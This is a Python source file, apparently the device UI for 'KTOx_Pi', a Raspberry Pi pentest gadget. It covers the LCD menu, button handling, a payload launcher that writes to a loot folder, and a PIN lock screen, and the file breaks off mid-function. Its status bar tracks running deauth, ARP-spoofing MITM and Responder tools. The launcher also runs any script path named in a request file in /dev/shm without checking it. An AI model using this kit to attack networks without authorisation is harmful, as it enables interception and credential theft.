#!/usr/bin/env python3
# ktox_device.py — KTOx_Pi v1.0
# Raspberry Pi Zero 2W · Kali ARM64 · Waveshare 1.44" LCD HAT (ST7735S)
#
# Architecture: mirrors KTOx exactly
#   · Global image / draw / LCD objects
#   · _display_loop  — LCD_ShowImage() at ~10 fps continuously
#   · _stats_loop    — toolbar (temp + status) every 2 s
#   · draw_lock      — threading.Lock  on every draw call
#   · screen_lock    — threading.Event frozen during payload
#   · getButton()    — virtual (WebUI Unix socket) first, then GPIO
#   · exec_payload() — subprocess.run() BLOCKING + _setup_gpio() restore
#
# WebUI: device_server.py (WebSocket :8765) + web_server.py (HTTP :8080)
# Loot:  /root/KTOx/loot/  (symlinked from /root/KTOx/loot)
#
# Menu navigation
#   Joystick UP/DOWN     navigate
#   Joystick CTR/RIGHT   select / enter
#   KEY1  / LEFT         back
#   KEY2                 home
#   KEY3                 stop attack / exit payload

import os, sys, time, json, threading, subprocess, signal, socket, ipaddress, math
import base64, hashlib, hmac, secrets
from datetime import datetime
from functools import partial
from pathlib import Path

# ── Paths ─────────────────────────────────────────────────────────────────────

KTOX_DIR     = "/root/KTOx"
INSTALL_PATH = KTOX_DIR + "/"
LOOT_DIR     = KTOX_DIR + "/loot"
PAYLOAD_DIR  = KTOX_DIR + "/payloads"
PAYLOAD_LOG  = LOOT_DIR + "/payload.log"
VERSION      = "1.0"

sys.path.insert(0, KTOX_DIR)
sys.path.insert(0, KTOX_DIR + "/ktox_pi")

# ── WebUI input bridge (independent of physical hardware) ──────────────────────

try:
    import ktox_input as rj_input
    HAS_INPUT = True
except Exception as _ie:
    print(f"[WARN] WebUI input bridge unavailable ({_ie})")
    HAS_INPUT = False

# ── Hardware imports ───────────────────────────────────────────────────────────

try:
    import RPi.GPIO as GPIO
    from PIL import Image, ImageDraw, ImageFont
    import LCD_1in44
    import LCD_Config
    HAS_HW = True
except Exception as _ie:
    print(f"[WARN] Hardware unavailable ({_ie}) — headless mode")
    HAS_HW = False

# ── GPIO pin map ───────────────────────────────────────────────────────────────

PINS = {
    "KEY_UP_PIN":    6,
    "KEY_DOWN_PIN":  19,
    "KEY_LEFT_PIN":  5,
    "KEY_RIGHT_PIN": 26,
    "KEY_PRESS_PIN": 13,
    "KEY1_PIN":      21,
    "KEY2_PIN":      20,
    "KEY3_PIN":      16,
}

# ── Threading primitives ───────────────────────────────────────────────────────

draw_lock   = threading.Lock()      # protect every draw call
screen_lock = threading.Event()     # set = freeze display / stats threads
_stop_evt   = threading.Event()

# ── Button debounce state ──────────────────────────────────────────────────────

_last_button       = None
_last_button_time  = 0.0
_button_down_since = 0.0
_debounce_s        = 0.10
_repeat_delay      = 0.25
_repeat_interval   = 0.08

# ── Manual-lock: hold KEY3 for this many seconds to lock from anywhere ─────────
_LOCK_HOLD_BTN  = "KEY3_PIN"
_LOCK_HOLD_SECS = 2.0

# ── Live status text (updated by _stats_loop) ─────────────────────────────────

_status_text = ""
_temp_c      = 0.0

# ── Payload state paths ────────────────────────────────────────────────────────

PAYLOAD_STATE_PATH   = "/dev/shm/ktox_payload_state.json"
PAYLOAD_REQUEST_PATH = "/dev/shm/rj_payload_request.json"   # WebUI uses rj_ prefix

# ── Global LCD / image / draw (KTOx pattern — must be globals) ───────────

LCD   = None
image = None
draw  = None

# ── Fonts ──────────────────────────────────────────────────────────────────────

text_font  = None
small_font = None
icon_font  = None

def _load_fonts():
    global text_font, small_font, icon_font
    MONO_BOLD = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono-Bold.ttf"
    MONO      = "/usr/share/fonts/truetype/dejavu/DejaVuSansMono.ttf"
    FA        = "/usr/share/fonts/truetype/fontawesome/fa-solid-900.ttf"
    def _f(p, sz):
        try:    return ImageFont.truetype(p, sz)
        except: return ImageFont.load_default()
    text_font  = _f(MONO_BOLD, 9)
    small_font = _f(MONO,      8)
    icon_font  = _f(FA,       12) if os.path.exists(FA) else None

# ── Runtime state ──────────────────────────────────────────────────────────────

ktox_state = {
    "iface":       "eth0",
    "wifi_iface":  "wlan0",   # updated by _init_wifi_iface() after GPIO setup
    "gateway":     "",
    "hosts":       [],
    "running":     None,
    "mon_iface":   None,
    "stealth":     False,
    "stealth_image": None,
}

def _init_wifi_iface():
    """Called once after hardware init. Prefer wlan1 (external adapter) over wlan0."""
    import re as _re
    try:
        rc, out = _run(["iw", "dev"])
        ifaces = _re.findall(r"Interface\s+(\w+)", out) if rc == 0 else []
    except Exception:
        ifaces = []
    for candidate in ("wlan1", "wlan2", "wlan3"):
        if candidate in ifaces:
            ktox_state["wifi_iface"] = candidate
            return
    # Keep wlan0 if it's the only one available

# ═══════════════════════════════════════════════════════════════════════════════
# ── Defaults / config class ────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

class Defaults:
    start_text      = [10, 20]
    text_gap        = 14
    install_path    = INSTALL_PATH
    payload_path    = PAYLOAD_DIR + "/"
    payload_log     = PAYLOAD_LOG
    imgstart_path   = "/root/"
    config_file     = KTOX_DIR + "/gui_conf.json"
    screensaver_gif = KTOX_DIR + "/img/screensaver/default.gif"

default = Defaults()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Colour scheme ──────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

class ColorScheme:
    border            = "#8B0000"
    background        = "#0a0a0a"
    text              = "#c8c8c8"
    selected_text     = "#FFFFFF"
    select            = "#640000"
    gamepad           = "#640000"
    gamepad_fill      = "#F0EDE8"

    def DrawBorder(self):
        draw.line([(127,12),(127,127)], fill=self.border, width=5)
        draw.line([(127,127),(0,127)],  fill=self.border, width=5)
        draw.line([(0,127),(0,12)],     fill=self.border, width=5)
        draw.line([(0,12),(128,12)],    fill=self.border, width=5)

    def DrawMenuBackground(self):
        draw.rectangle((3, 14, 124, 124), fill=self.background)

    def load_from_file(self):
        try:
            data = json.loads(Path(default.config_file).read_text())
            c = data.get("COLORS", {})
            self.border        = c.get("BORDER",            self.border)
            self.background    = c.get("BACKGROUND",         self.background)
            self.text          = c.get("TEXT",               self.text)
            self.selected_text = c.get("SELECTED_TEXT",      self.selected_text)
            self.select        = c.get("SELECTED_TEXT_BACKGROUND", self.select)
            self.gamepad       = c.get("GAMEPAD",            self.gamepad)
            self.gamepad_fill  = c.get("GAMEPAD_FILL",       self.gamepad_fill)
            # Load lock config and screensaver path
            _lock_load_from_config(data)
            p = data.get("PATHS", {}).get("SCREENSAVER_GIF", "")
            if p:
                default.screensaver_gif = p
        except Exception:
            pass

color = ColorScheme()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Hardware init / restore ────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _setup_gpio():
    """
    (Re-)initialise GPIO + LCD.  Called once at boot and after every
    exec_payload() because payloads call GPIO.cleanup() on exit which
    kills the SPI bus.
    """
    global LCD, image, draw
    if not HAS_HW:
        if image is None:
            image = Image.new("RGB", (128, 128), "#0a0a0a")
            draw  = ImageDraw.Draw(image)
        return

    GPIO.setmode(GPIO.BCM)
    GPIO.setwarnings(False)
    for pin in PINS.values():
        GPIO.setup(pin, GPIO.IN, pull_up_down=GPIO.PUD_UP)

    LCD   = LCD_1in44.LCD()
    LCD.LCD_Init(LCD_1in44.SCAN_DIR_DFT)
    LCD_Config.Driver_Delay_ms(50)   # 50ms settle after GPIO init
    image = Image.new("RGB", (LCD.width, LCD.height), "#0a0a0a")
    draw  = ImageDraw.Draw(image)


def _hw_init():
    """Full boot initialisation."""
    _setup_gpio()
    _load_fonts()
    _init_wifi_iface()   # auto-select wlan1 if present
    color.load_from_file()
    # Show KTOx logo BMP if available
    logo = Path(INSTALL_PATH + "img/logo.bmp")
    if HAS_HW and logo.exists():
        try:
            img = Image.open(logo)
            LCD.LCD_ShowImage(img, 0, 0)
            time.sleep(0.8)
        except Exception:
            pass

# ═══════════════════════════════════════════════════════════════════════════════
# ── Background threads ─────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _temp() -> float:
    try:
        with open("/sys/class/thermal/thermal_zone0/temp") as f:
            return int(f.read()) / 1000
    except Exception:
        return 0.0


def _draw_toolbar():
    """Draw temp + status bar at y=0..11.  Caller holds draw_lock."""
    try:
        draw.rectangle([(0,0),(128,11)], fill="#0d0000")
        # Temp left side
        draw.text((1,1), f"{_temp_c:.0f}C", font=small_font, fill="#5a2020")
        # Version tag right side
        draw.text((100,1), f"v{VERSION}", font=small_font, fill="#3a0000")
        # Status or brand centre
        if _status_text:
            draw.text((22,1), _status_text[:14], font=small_font, fill=color.border)
        else:
            draw.text((34,1), "KTOx_Pi", font=small_font, fill="#4a0000")
        draw.line([(0,11),(128,11)], fill=color.border, width=1)
    except Exception:
        pass


def _stats_loop():
    global _status_text, _temp_c
    while not _stop_evt.is_set():
        if screen_lock.is_set():
            time.sleep(0.5)
            continue
        try:
            _temp_c = _temp()
            s = ""
            if ktox_state.get("running"):
                s = f"[{ktox_state['running'][:14]}]"
            elif subprocess.call(["pgrep","airodump-ng"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                s = "(WiFi scan)"
            elif subprocess.call(["pgrep","aireplay-ng"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                s = "(deauth)"
            elif subprocess.call(["pgrep","arpspoof"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                s = "(MITM)"
            elif subprocess.call(["pgrep","Responder"],
                                 stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL) == 0:
                s = "(Responder)"
            _status_text = s
            with draw_lock:
                _draw_toolbar()
        except Exception:
            pass
        time.sleep(2)


def _display_loop():
    _FRAME_PATH     = os.environ.get("RJ_FRAME_PATH", "/dev/shm/ktox_last.jpg")
    _FRAME_ENABLED  = os.environ.get("RJ_FRAME_MIRROR", "1") != "0"
    _FRAME_INTERVAL = 1.0 / max(1.0, float(os.environ.get("RJ_FRAME_FPS", "10")))
    last_save = 0.0

    while not _stop_evt.is_set():
        if not screen_lock.is_set() and HAS_HW and LCD and image:
            mirror = None
            with draw_lock:
                try:
                    LCD.LCD_ShowImage(image, 0, 0)
                except Exception:
                    pass
                if _FRAME_ENABLED:
                    now = time.monotonic()
                    if now - last_save >= _FRAME_INTERVAL:
                        try:    mirror = image.copy()
                        except: pass
                        last_save = now
            if mirror:
                try:    mirror.save(_FRAME_PATH, "JPEG", quality=80)
                except: pass
        time.sleep(0.2)


def start_background_loops():
    threading.Thread(target=_stats_loop,   daemon=True).start()
    threading.Thread(target=_display_loop, daemon=True).start()

# ═══════════════════════════════════════════════════════════════════════════════
# ── Button input ───────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def getButton(timeout=120):
    """
    Block until a button press and return its pin name string.
    Checks WebUI virtual buttons (Unix socket via rj_input) first.
    timeout: max seconds to wait (default 120 — prevents infinite freeze).
    Returns None on timeout.
    """
    global _last_button, _last_button_time, _button_down_since
    start = time.time()

    while True:
        # Hard timeout — prevents infinite freeze
        if (time.time() - start) > timeout:
            _last_button = None
            return None

        # Auto-lock check
        if _should_auto_lock():
            lock_device("Auto lock")
            start = time.time()  # Reset timeout after returning from lock
            continue

        # Poll WebUI payload launch request
        if not screen_lock.is_set():
            req = _check_payload_request()
            if req:
                exec_payload(req)
                continue

        # Virtual button from WebUI (Unix socket) — works with or without GPIO hardware
        if HAS_INPUT:
            try:
                v = rj_input.get_virtual_button()
                if v:
                    # Special: WebUI can send "MANUAL_LOCK" to trigger the lock combo
                    if v == "MANUAL_LOCK":
                        _mark_user_activity()
                        lock_device("Manual lock")
                        start = time.time()
                        continue
                    _mark_user_activity()
                    _last_button = None
                    return v
            except Exception:
                pass

        if not HAS_HW:
            time.sleep(0.1)
            continue

        # Physical GPIO
        pressed = None
        for name, pin in PINS.items():
            try:
                if GPIO.input(pin) == 0:
                    pressed = name
                    break
            except Exception:
                pass

        if pressed is None:
            _last_button = None
            time.sleep(0.01)
            continue

        now = time.time()

        # ── KEY3 long-hold → lock screen ──────────────────────────────────────
        # If KEY3 is held for _LOCK_HOLD_SECS, trigger lock instead of repeating.
        if (pressed == _LOCK_HOLD_BTN
                and pressed == _last_button
                and (now - _button_down_since) >= _LOCK_HOLD_SECS):
            _last_button = None
            _mark_user_activity()
            lock_device("Manual lock")
            start = time.time()
            continue

        # Stuck-button safety: non-KEY3 buttons held >2s are discarded
        if pressed == _last_button and pressed != _LOCK_HOLD_BTN and (now - _button_down_since) > 2.0:
            _last_button = None
            time.sleep(0.15)
            continue

        if pressed != _last_button:
            _last_button       = pressed
            _last_button_time  = now
            _button_down_since = now
            _mark_user_activity()
            return pressed

        if (now - _last_button_time) < _debounce_s:
            time.sleep(0.01)
            continue
        if ((now - _button_down_since) >= _repeat_delay
                and (now - _last_button_time) >= _repeat_interval):
            _last_button_time = now
            return pressed
        time.sleep(0.01)

# ═══════════════════════════════════════════════════════════════════════════════
# ── Text / drawing helpers ─────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _centered(text, y, font=None, fill=None):
    if font is None: font = text_font
    if fill is None: fill = color.selected_text
    bbox = draw.textbbox((0,0), text, font=font)
    w    = bbox[2] - bbox[0]
    draw.text(((128-w)//2, y), text, font=font, fill=fill)


def _truncate(text, max_w, font=None, ellipsis="…"):
    if font is None: font = text_font
    if not text: return ""
    if draw.textbbox((0,0), text, font=font)[2] <= max_w:
        return text
    ew   = draw.textbbox((0,0), ellipsis, font=font)[2]
    lo, hi, best = 0, len(text), ""
    while lo <= hi:
        mid = (lo+hi)//2
        w   = draw.textbbox((0,0), text[:mid], font=font)[2]
        if w + ew <= max_w:
            best = text[:mid]; lo = mid+1
        else:
            hi = mid-1
    return best + ellipsis


def Dialog(text, wait=True):
    with draw_lock:
        _draw_toolbar()
        draw.rectangle([0,12,128,128],   fill=color.background)
        draw.rectangle([4,16,124,112],   fill="#0d0606")
        draw.rectangle([4,16,124,112],   outline=color.border, width=1)
        # horizontal rule
        draw.line([(4,100),(124,100)],   fill=color.border, width=1)
        lines = text.splitlines()
        y = 16 + max(4, (84 - len(lines)*14)//2)
        for line in lines:
            _centered(line, y, fill=color.text)
            y += 14
        # OK button
        draw.rectangle([44,102,84,112],  fill=color.select)
        _centered("OK", 103, fill=color.selected_text)
    if wait:
        time.sleep(0.25)
        getButton()


def Dialog_info(text, wait=True, timeout=None):
    with draw_lock:
        _draw_toolbar()
        draw.rectangle([3,14,124,124], fill=color.select)
        draw.rectangle([3,14,124,124], outline=color.border, width=2)
        lines = text.splitlines()
        y     = 14 + max(0, (110 - len(lines)*14)//2)
        for line in lines:
            _centered(line, y, fill=color.selected_text)
            y += 14
    if wait:
        time.sleep(0.25)
        getButton()
    elif timeout:
        end = time.time() + timeout
        while time.time() < end:
            time.sleep(0.2)


def YNDialog(a="Are you sure?", y="Yes", n="No", b=""):
    with draw_lock:
        _draw_toolbar()
        draw.rectangle([0,12,128,128],  fill=color.background)
        draw.rectangle([4,16,124,118],  fill="#0d0606")
        draw.rectangle([4,16,124,118],  outline=color.border, width=1)
        _centered(a, 20, fill=color.selected_text)
        if b: _centered(b, 36, fill=color.text)
        draw.line([(4,52),(124,52)],    fill=color.border, width=1)
    time.sleep(0.25)
    answer = False
    while True:
        with draw_lock:
            _draw_toolbar()
            # YES button
            yc_bg = color.select  if answer      else "#1a0505"
            nc_bg = color.select  if not answer  else "#1a0505"
            yc_tx = color.selected_text if answer      else color.text
            nc_tx = color.selected_text if not answer  else color.text
            draw.rectangle([8,56,58,72],   fill=yc_bg, outline=color.border)
            draw.rectangle([70,56,120,72], fill=nc_bg, outline=color.border)
            _centered(y, 58, fill=yc_tx)
            draw.text((76,58), n, font=text_font, fill=nc_tx)
            # hint
            draw.line([(4,80),(124,80)], fill="#2a0505", width=1)
            _centered("LEFT=Yes  RIGHT=No", 84, font=small_font, fill="#4a2020")
        btn = getButton()
        if   btn in ("KEY_LEFT_PIN","KEY1_PIN"):    answer = True
        elif btn in ("KEY_RIGHT_PIN","KEY3_PIN"):   answer = False
        elif btn in ("KEY_PRESS_PIN","KEY2_PIN"):   return answer


def GetMenuString(inlist, duplicates=False):
    """
    Scrollable list.  Returns selected label string, or "" on back.
    If duplicates=True returns (int_index, label_string).
    KEY1/KEY2/KEY3 all act as back/escape.
    """
    WINDOW = 7
    if not inlist:
        inlist = ["(empty)"]
    if duplicates:
        inlist = [f"{i}#{t}" for i, t in enumerate(inlist)]
    total  = len(inlist)
    index  = 0
    offset = 0

    while True:
        if index < offset:           offset = index
        elif index >= offset+WINDOW: offset = index - WINDOW + 1
        window = inlist[offset:offset+WINDOW]

        with draw_lock:
            _draw_toolbar()
            color.DrawMenuBackground()
            color.DrawBorder()
            for i, raw in enumerate(window):
                txt   = raw if not duplicates else raw.split("#", 1)[1]
                sel   = (i == index - offset)
                row_y = 14 + 14 * i
                if sel:
                    draw.rectangle([3, row_y, 124, row_y + 12], fill=color.select)
                fill = color.selected_text if sel else color.text
                icon = _icon_for(txt)
                if icon:
                    draw.text((5,  row_y + 1), icon, font=icon_font, fill=fill)
                    t = _truncate(txt.strip(), 90)
                    draw.text((23, row_y + 1), t,    font=text_font, fill=fill)
                else:
                    t = _truncate(txt.strip(), 110)
                    draw.text((5,  row_y + 1), t,    font=text_font, fill=fill)
            # Scroll-position pip (right edge)
            if total > WINDOW:
                pip_h = max(6, int(WINDOW / total * 110))
                pip_y = 14 + int(offset / max(1, total - WINDOW) * (110 - pip_h))
                draw.rectangle([125, pip_y, 127, pip_y + pip_h], fill=color.border)

        time.sleep(0.08)
        btn = getButton(timeout=0.5)   # short timeout prevents deadlock
        if   btn is None:                              continue
        elif btn == "KEY_DOWN_PIN":                    index = (index+1) % total
        elif btn == "KEY_UP_PIN":                      index = (index-1) % total
        elif btn in ("KEY_PRESS_PIN","KEY_RIGHT_PIN"):
            raw = inlist[index]
            if duplicates:
                idx, txt = raw.split("#", 1)
                return int(idx), txt
            return raw
        elif btn in ("KEY_LEFT_PIN","KEY1_PIN","KEY2_PIN","KEY3_PIN"):
            return (-1,"") if duplicates else ""


def RenderMenuWindowOnce(inlist, selected=0):
    WINDOW = 7
    if not inlist: inlist = ["(empty)"]
    total  = len(inlist)
    idx    = max(0, min(selected, total-1))
    offset = max(0, min(idx-2, total-WINDOW))
    window = inlist[offset:offset+WINDOW]
    with draw_lock:
        _draw_toolbar()
        color.DrawMenuBackground()
        color.DrawBorder()
        for i, txt in enumerate(window):
            sel   = (i == idx - offset)
            row_y = 14 + 14 * i
            if sel:
                draw.rectangle([3, row_y, 124, row_y + 12], fill=color.select)
            fill = color.selected_text if sel else color.text
            icon = _icon_for(txt)
            if icon:
                draw.text((5,  row_y + 1), icon, font=icon_font, fill=fill)
                t = _truncate(txt.strip(), 94)
                draw.text((19, row_y + 1), t,    font=text_font, fill=fill)
            else:
                t = _truncate(txt.strip(), 110)
                draw.text((5,  row_y + 1), t,    font=text_font, fill=fill)

# ═══════════════════════════════════════════════════════════════════════════════
# ── Payload engine ─────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _write_payload_state(running: bool, path=None):
    try:
        with open(PAYLOAD_STATE_PATH, "w") as f:
            json.dump({"running": running, "path": path, "ts": time.time()}, f)
    except Exception:
        pass


def _check_payload_request():
    try:
        with open(PAYLOAD_REQUEST_PATH) as f:
            data = json.load(f)
        os.remove(PAYLOAD_REQUEST_PATH)
        if data.get("action") == "start" and data.get("path"):
            return str(data["path"])
    except (FileNotFoundError, OSError):
        pass
    except Exception:
        pass
    return None


def exec_payload(filename, *args):
    """
    Execute a KTOx/KTOx-compatible payload.
    BLOCKING — menu is frozen until payload exits.
    Fully restores GPIO + LCD after payload calls GPIO.cleanup().
    """
    if isinstance(filename, (list, tuple)):
        args     = tuple(filename[1:]) + args
        filename = filename[0]

    # Resolve absolute path
    if os.path.isabs(filename):
        full = filename
    else:
        full = os.path.join(default.payload_path, filename)
    if not full.endswith(".py"):
        full += ".py"
    if not os.path.isfile(full):
        Dialog(f"Not found:\n{os.path.basename(full)}", wait=True)
        return

    print(f"[PAYLOAD] ► {filename}")
    _write_payload_state(True, filename)
    screen_lock.set()

    env = os.environ.copy()
    env["PYTHONPATH"] = (
        INSTALL_PATH + os.pathsep
        + KTOX_DIR   + os.pathsep
        + env.get("PYTHONPATH", "")
    )
    env["KTOX_PAYLOAD"]      = "1"
    env["KTOX_LOOT_DIR"]     = LOOT_DIR
    env["PAYLOAD_LOOT_DIR"]  = LOOT_DIR

    os.makedirs(LOOT_DIR, exist_ok=True)
    log_fh = open(default.payload_log, "ab", buffering=0)

    try:
        result = subprocess.run(
            ["python3", full] + list(args),
            cwd=INSTALL_PATH,
            env=env,
            stdout=log_fh,
            stderr=subprocess.STDOUT,
        )
        if result.returncode != 0:
            print(f"[PAYLOAD] exit code {result.returncode}")
    except Exception as exc:
        print(f"[PAYLOAD] ERROR: {exc!r}")
    finally:
        log_fh.close()

    # ── Restore hardware ────────────────────────────────────────────────────
    print("[PAYLOAD] ◄ Restoring hardware…")
    _write_payload_state(False)
    try:
        _setup_gpio()
        _load_fonts()

        try:
            if HAS_INPUT:
                rj_input.restart_listener()
        except Exception:
            pass

        # Flush any virtual button events that piled up while the payload ran
        # so they don't trigger unintended menu actions after returning.
        try:
            if HAS_INPUT:
                rj_input.flush()
        except Exception:
            pass

        with draw_lock:
            try:
                draw.rectangle((0, 0, 128, 128), fill=color.background)
                color.DrawBorder()
            except Exception:
                pass

        # Push frame immediately after LCD re-init — closes the white flash
        # window that opens during LCD_Reset() inside _setup_gpio().
        if HAS_HW and LCD and image:
            try:
                LCD.LCD_ShowImage(image, 0, 0)
            except Exception:
                pass

        m.render_current()

        # Drain any held buttons + clear stale state (500ms max)
        global _last_button, _last_button_time, _button_down_since
        _last_button       = None
        _last_button_time  = 0.0
        _button_down_since = 0.0
        if HAS_HW:
            t0 = time.time()
            while (any(GPIO.input(p) == 0 for p in PINS.values())
                   and time.time()-t0 < 0.5):
                time.sleep(0.03)
        _last_button = None  # clear again after drain

    except Exception as _hw_err:
        print(f"[PAYLOAD] hw restore error: {_hw_err!r}")
    finally:
        screen_lock.clear()
    print("[PAYLOAD] ✔ ready")

# ═══════════════════════════════════════════════════════════════════════════════
# ── Network helpers ────────────────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

def _run(cmd, timeout=15):
    try:
        r = subprocess.run(
            cmd, capture_output=True, text=True, timeout=timeout,
            shell=isinstance(cmd, str)
        )
        return r.returncode, r.stdout + r.stderr
    except Exception as e:
        return -1, str(e)


def get_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.settimeout(2)
        s.connect(("8.8.8.8", 80))
        return s.getsockname()[0]
    except Exception:
        pass
    # Fallback: read from interface directly
    try:
        rc, out = _run(["ip","-4","addr","show",ktox_state["iface"]], timeout=3)
        import re
        m = re.search(r"inet (\d+\.\d+\.\d+\.\d+)", out)
        if m: return m.group(1)
    except Exception:
        pass
    return "0.0.0.0"


def get_gateway():
    try:
        rc, out = _run(["ip", "route", "show", "default"], timeout=4)
        import re
        m = re.search(r"default via (\d+\.\d+\.\d+\.\d+)", out)
        return m.group(1) if m else ""
    except Exception:
        return ""


def detect_iface():
    """Find first active wired/USB interface — single subprocess call."""
    try:
        rc, out = _run(["ip","-o","link","show"], timeout=5)
        import re
        # Prefer eth0/usb0 (wired), then wlan1 (external wifi), then wlan0
        ifaces = re.findall(r"\d+: (\w+):", out)
        for preferred in ("eth0","usb0","eth1","wlan1"):
            if preferred in ifaces:
                return preferred
        # Return first non-lo non-wlan0 interface
        for i in ifaces:
            if i not in ("lo","wlan0"):
                return i
    except Exception:
        pass
    return "eth0"


def refresh_state():
    ktox_state["iface"]   = detect_iface()
    ktox_state["gateway"] = get_gateway()


def loot_count():
    try: return len(list(Path(LOOT_DIR).glob("**/*")))
    except: return 0

# ═══════════════════════════════════════════════════════════════════════════════
# ── PIN / Sequence Lock Screen ─────────────────────────────────────────────────
# ═══════════════════════════════════════════════════════════════════════════════

# ── Constants ─────────────────────────────────────────────────────────────────

LOCK_PIN_PBKDF2_ROUNDS   = 40000
LOCK_SCREEN_STATIC_SECS  = 1.2
LOCK_MODE_PIN            = "pin"
LOCK_MODE_SEQUENCE       = "sequence"
LOCK_SEQUENCE_LENGTH     = 6
LOCK_SEQUENCE_ALLOWED    = ("KEY_UP_PIN","KEY_DOWN_PIN","KEY_LEFT_PIN",
                             "KEY_RIGHT_PIN","KEY1_PIN","KEY2_PIN")
LOCK_SEQUENCE_LABELS     = {"KEY_UP_PIN":"UP","KEY_DOWN_PIN":"DOWN",
                             "KEY_LEFT_PIN":"LEFT","KEY_RIGHT_PIN":"RIGHT",
                             "KEY1_PIN":"KEY1","KEY2_PIN":"KEY2"}
LOCK_SEQUENCE_TOKENS     = {"KEY_UP_PIN":"U","KEY_DOWN_PIN":"D",
                             "KEY_LEFT_PIN":"L","KEY_RIGHT_PIN":"R",
                             "KEY1_PIN":"1","KEY2_PIN":"2"}
LOCK_SEQUENCE_DEBOUNCE   = 0.06
LOCK_TIMEOUT_OPTIONS     = [(0,"Never"),(15,"15 sec"),(30,"30 sec"),
                             (60,"1 min"),(300,"5 min"),(600,"10 min")]

LOCK_DEFAULTS = {
    "enabled": False, "mode": LOCK_MODE_PIN,
    "pin_hash": "", "sequence_hash": "",
    "sequence_length": LOCK_SEQUENCE_LENGTH, "auto_lock_seconds": 0,
}

# ── Runtime state ─────────────────────────────────────────────────────────────

lock_config  = LOCK_DEFAULTS.copy()
lock_runtime = {
    "locked": False, "last_activity": time.monotonic(),
    "in_lock_flow": False, "suspend_auto_lock": False,
    "showing_screensaver": False,
}
_lock_ss_cache = {"path": None, "mtime": None, "frames": [], "durations": []}
_random_screensaver = False

# ── Crypto helpers ────────────────────────────────────────────────────────────

def _b64url(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).decode().rstrip("=")

def _hash_pin(pin: str, rounds: int = LOCK_PIN_PBKDF2_ROUNDS) -> str:
    salt = secrets.token_hex(16)
    dk   = hashlib.pbkdf2_hmac("sha256", pin.encode(), salt.encode(), rounds)
    return f"pbkdf2_sha256${rounds}${salt}${_b64url(dk)}"

def _verify_pin(pin: str, encoded: str) -> bool:
    try:
        algo, rounds, salt, digest = encoded.split("$", 3)
        if algo != "pbkdf2_sha256": return False
        dk = hashlib.pbkdf2_hmac("sha256", pin.encode(), salt.encode(), int(rounds))
        return hmac.compare_digest(_b64url(dk), digest)
    except Exception:
        return False

def _hash_sequence(seq: list) -> str:
    return _hash_pin("|".join(seq))

def _verify_sequence(seq: list, encoded: str) -> bool:
    return _verify_pin("|".join(seq), encoded)

# ── Config helpers ────────────────────────────────────────────────────────────

def _lock_mode() -> str:
    m = str(lock_config.get("mode") or LOCK_MODE_PIN)
    return m if m in (LOCK_MODE_PIN, LOCK_MODE_SEQUENCE) else LOCK_MODE_PIN

def _lock_mode_label(mode=None) -> str:
    return "Sequence" if (mode or _lock_mode()) == LOCK_MODE_SEQUENCE else "PIN"

def _lock_has_pin() -> bool:
    return bool(str(lock_config.get("pin_hash") or "").strip())

def _lock_has_sequence() -> bool:
    return bool(str(lock_config.get("sequence_hash") or "").strip())

def _lock_has_secret(mode=None) -> bool:
    return _lock_has_sequence() if (mode or _lock_mode()) == LOCK_MODE_SEQUENCE else _lock_has_pin()

def _lock_is_enabled() -> bool:
    return bool(lock_config.get("enabled")) and _lock_has_secret()

def _lock_timeout_label(secs=None) -> str:
    v = int(lock_config.get("auto_lock_seconds") or 0) if secs is None else int(secs)
    for c, lbl in LOCK_TIMEOUT_OPTIONS:
        if c == v: return lbl
    return f"{v} sec" if v > 0 else "Never"

def _mark_user_activity():
    lock_runtime["last_activity"] = time.monotonic()

def _should_auto_lock() -> bool:
    if lock_runtime["locked"] or lock_runtime["in_lock_flow"] or lock_runtime["suspend_auto_lock"]:
        return False
    if not _lock_is_enabled(): return False
    t = int(lock_config.get("auto_lock_seconds") or 0)
    return t > 0 and (time.monotonic() - lock_runtime["last_activity"]) >= t

def _lock_load_from_config(data: dict):
    """Called from ColorScheme.load_from_file — populates lock_config."""
    raw = data.get("LOCK", {})
    if not isinstance(raw, dict): return
    lock_config["enabled"]          = bool(raw.get("enabled", False))
    mode = str(raw.get("mode", LOCK_MODE_PIN)).strip().lower()
    lock_config["mode"]             = mode if mode in (LOCK_MODE_PIN, LOCK_MODE_SEQUENCE) else LOCK_MODE_PIN
    lock_config["pin_hash"]         = str(raw.get("pin_hash") or "").strip()
    lock_config["sequence_hash"]    = str(raw.get("sequence_hash") or "").strip()
    lock_config["auto_lock_seconds"] = max(0, int(raw.get("auto_lock_seconds") or 0))
    if lock_config["enabled"] and not _lock_has_secret():
        lock_config["enabled"] = False

def _lock_save_config():
    """Persist lock config into gui_conf.json alongside colors."""
    try:
        path = default.config_file
        try:
            data = json.loads(Path(path).read_text())
        except Exception:
            data = {}
        data["LOCK"] = {
            "enabled": bool(lock_config.get("enabled")),
            "mode": _lock_mode(),
            "pin_hash": str(lock_config.get("pin_hash") or ""),
            "sequence_hash": str(lock_config.get("sequence_hash") or ""),
            "auto_lock_seconds": max(0, int(lock_config.get("auto_lock_seconds") or 0)),
        }
        data.setdefault("PATHS", {})["SCREENSAVER_GIF"] = default.screensaver_gif
        tmp = path + ".tmp"
        Path(tmp).write_text(json.dumps(data, indent=4, sort_keys=True))
        os.replace(tmp, path)
        try: os.chmod(path, 0o600)
        except Exception: pass
    except Exception as e:
        print(f"[LOCK] save_config error: {e}")

# ── Button helpers (used during lock UI) ─────────────────────────────────────

def _wait_button_release(timeout=1.0):
